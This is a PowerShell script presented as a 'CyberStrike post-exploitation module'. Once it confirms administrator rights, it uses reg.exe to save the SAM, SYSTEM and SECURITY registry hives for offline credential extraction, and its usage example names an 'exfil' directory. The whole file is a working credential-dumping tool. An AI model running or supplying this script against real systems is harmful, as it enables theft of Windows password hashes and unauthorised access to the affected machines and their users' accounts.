<#
.SYNOPSIS
    Extract SAM/SYSTEM/SECURITY registry hives.
.DESCRIPTION
    CyberStrike post-exploitation module: saves SAM, SYSTEM, and SECURITY
    registry hives for offline credential extraction.
    Requires administrative privileges.
.PARAMETER outdir
    Output directory. Default: $env:TEMP\sam_dump_<timestamp>.
.PARAMETER json-output
    Emit structured JSON lines to stdout.
.PARAMETER help
    Show usage and exit.
#>

param(
    [string]$outdir = "",
    [switch]${json-output},
    [switch]$help
)

# ---------------------------------------------------------------------------
# Parse -- prefixed args from $args overflow
# ---------------------------------------------------------------------------
$i = 0
while ($i -lt $args.Count) {
    switch ($args[$i]) {
        "--outdir"      { $outdir = $args[$i + 1]; $i += 2 }
        "--json-output" { ${json-output} = $true; $i++ }
        "--help"        { $help = $true; $i++ }
        default         { $i++ }
    }
}

$JsonOutput = ${json-output}

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
function Write-JsonLine {
    param([hashtable]$Data)
    $Data["timestamp"] = (Get-Date -Format "o")
    $Data | ConvertTo-Json -Compress | Write-Output
}

function Write-Msg {
    param([string]$Level, [string]$Message, [hashtable]$Extra = @{})
    if ($JsonOutput) {
        $obj = @{ level = $Level; message = $Message } + $Extra
        Write-JsonLine $obj
    } else {
        $prefix = switch ($Level) { "error" { "[-]" } "success" { "[+]" } default { "[*]" } }
        Write-Host "$prefix $Message"
    }
}

# ---------------------------------------------------------------------------
# Help
# ---------------------------------------------------------------------------
if ($help) {
    $usage = @"
sam_dump.ps1 - Extract SAM/SYSTEM/SECURITY registry hives

USAGE:
    .\sam_dump.ps1 [--outdir PATH] [--json-output] [--help]

OPTIONS:
    --outdir      Output directory (default: `$env:TEMP\sam_dump_<timestamp>)
    --json-output Emit JSON line output
    --help        Show this message

EXAMPLES:
    .\sam_dump.ps1
    .\sam_dump.ps1 --outdir C:\exfil\hives --json-output
"@
    Write-Host $usage
    exit 0
}

# ---------------------------------------------------------------------------
# Admin check
# ---------------------------------------------------------------------------
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)
if (-not $isAdmin) {
    Write-Msg -Level "error" -Message "This script requires administrative privileges. Run as Administrator."
    exit 1
}

# ---------------------------------------------------------------------------
# Output directory
# ---------------------------------------------------------------------------
if ([string]::IsNullOrEmpty($outdir)) {
    $ts = Get-Date -Format "yyyyMMdd_HHmmss"
    $outdir = Join-Path $env:TEMP "sam_dump_$ts"
}
if (-not (Test-Path $outdir)) {
    try {
        New-Item -ItemType Directory -Path $outdir -Force -ErrorAction Stop | Out-Null
        Write-Msg -Level "info" -Message "Created output directory: $outdir"
    } catch {
        Write-Msg -Level "error" -Message "Failed to create output directory '$outdir': $_"
        exit 1
    }
}

# ---------------------------------------------------------------------------
# Cleanup handler
# ---------------------------------------------------------------------------
$cleanupDone = $false
function Invoke-Cleanup {
    if ($script:cleanupDone) { return }
    $script:cleanupDone = $true
    Write-Msg -Level "info" -Message "Cleanup complete."
}
Register-EngineEvent PowerShell.Exiting -Action { Invoke-Cleanup } | Out-Null

# ---------------------------------------------------------------------------
# Registry hive definitions
# ---------------------------------------------------------------------------
$hives = @(
    @{ Name = "SAM";      Key = "HKLM\SAM" },
    @{ Name = "SYSTEM";   Key = "HKLM\SYSTEM" },
    @{ Name = "SECURITY"; Key = "HKLM\SECURITY" }
)

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
try {
    Write-Msg -Level "info" -Message "Starting SAM/SYSTEM/SECURITY hive extraction to $outdir"

    $results = @()
    $allSuccess = $true

    foreach ($hive in $hives) {
        $hivePath = Join-Path $outdir $hive.Name
        $entry = @{
            hive   = $hive.Name
            key    = $hive.Key
            file   = $hivePath
            status = "pending"
        }

        try {
            Write-Msg -Level "info" -Message "Saving $($hive.Key) -> $hivePath"
            $proc = Start-Process -FilePath "reg.exe" `
                -ArgumentList "save `"$($hive.Key)`" `"$hivePath`" /y" `
                -NoNewWindow -Wait -PassThru -RedirectStandardError "$env:TEMP\reg_err_$($hive.Name).tmp" `
                -ErrorAction Stop

            if ($proc.ExitCode -ne 0) {
                $errMsg = ""
                $errFile = "$env:TEMP\reg_err_$($hive.Name).tmp"
                if (Test-Path $errFile) {
                    $errMsg = Get-Content $errFile -Raw
                    Remove-Item $errFile -Force -ErrorAction SilentlyContinue
                }
                throw "reg save exited with code $($proc.ExitCode). $errMsg"
            }

            # Clean up stderr temp file on success
            $errFile = "$env:TEMP\reg_err_$($hive.Name).tmp"
            if (Test-Path $errFile) {
                Remove-Item $errFile -Force -ErrorAction SilentlyContinue
            }

            if (Test-Path $hivePath) {
                $fi = Get-Item $hivePath
                $entry.status = "success"
                $entry.size_bytes = $fi.Length
                $entry.size_kb = [math]::Round($fi.Length / 1KB, 2)
                Write-Msg -Level "success" -Message "$($hive.Name) saved ($($entry.size_kb) KB)"
            } else {
                throw "File not found after reg save"
            }
        } catch {
            $entry.status = "failure"
            $entry.error = "$_"
            $allSuccess = $false
            Write-Msg -Level "error" -Message "Failed to save $($hive.Name): $_"
        }

        $results += $entry
    }

    # ---------------------------------------------------------------------------
    # Summary
    # ---------------------------------------------------------------------------
    $summary = @{
        status  = if ($allSuccess) { "success" } else { "partial_failure" }
        outdir  = $outdir
        hives   = $results
        total   = $hives.Count
        saved   = ($results | Where-Object { $_.status -eq "success" }).Count
        failed  = ($results | Where-Object { $_.status -eq "failure" }).Count
    }

    if ($allSuccess) {
        Write-Msg -Level "success" -Message "All registry hives saved to $outdir" -Extra $summary
    } else {
        Write-Msg -Level "error" -Message "Some hives failed to save. Check results." -Extra $summary
        exit 1
    }
} catch {
    Write-Msg -Level "error" -Message "Unhandled error: $_"
    exit 1
} finally {
    Invoke-Cleanup
}
